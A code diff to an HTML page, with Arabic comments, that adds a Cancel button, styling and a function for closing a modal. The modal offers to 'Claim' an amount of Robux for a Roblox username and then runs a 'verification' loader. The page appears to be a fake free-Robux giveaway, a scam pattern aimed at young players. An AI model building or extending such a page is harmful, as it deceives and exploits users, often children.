@@ -135,6 +135,7 @@
             max-width: 400px;
             text-align: center;
             box-shadow: 0 20px 40px rgba(0,0,0,0.8);
+            position: relative;
         }
 
         .modal img {
@@ -160,6 +161,12 @@
             border-color: #00a2ff;
         }
 
+        .modal-actions {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
         .btn-submit {
             background: linear-gradient(180deg, #10b981 0%, #059669 100%);
             color: #fff;
@@ -171,6 +178,25 @@
             font-size: 1.05rem;
             cursor: pointer;
             box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
+        }
+
+        /* تنسيق زر الإلغاء */
+        .btn-cancel {
+            background: transparent;
+            color: #94a3b8;
+            font-weight: 600;
+            border: 1px solid #30363d;
+            padding: 10px;
+            width: 100%;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-cancel:hover {
+            background: #21262d;
+            color: #ffffff;
         }
 
         .loader-container {
@@ -288,7 +314,12 @@
                 <h3><span id="txtClaim">Claim</span> <span id="selectedAmount" style="color: #f59e0b;"></span> Robux</h3>
                 <p id="txtInputDesc" style="font-size: 0.85rem; color: #94a3b8;">Enter your Roblox Username to deliver items:</p>
                 <input type="text" id="robloxUsername" placeholder="Username (e.g. Gamer123)" required>
-                <button class="btn-submit" id="txtSubmit" onclick="startVerification()">Continue ➔</button>
+                
+                <div class="modal-actions">
+                    <button class="btn-submit" id="txtSubmit" onclick="startVerification()">Continue ➔</button>
+                    <!-- زر الإلغاء/الرجوع -->
+                    <button class="btn-cancel" onclick="closeModal()">Cancel</button>
+                </div>
             </div>
 
             <div id="modalStep2" class="loader-container">
@@ -328,6 +359,12 @@
             document.getElementById('usernameModal').style.display = 'flex';
             document.getElementById('modalStep1').style.display = 'block';
             document.getElementById('modalStep2').style.display = 'none';
+        }
+
+        // دالة إغلاق النافذة (الرجوع)
+        function closeModal() {
+            document.getElementById('usernameModal').style.display = 'none';
+            document.getElementById('robloxUsername').value = ''; // تفريغ الخانة
         }
 
         function startVerification() {
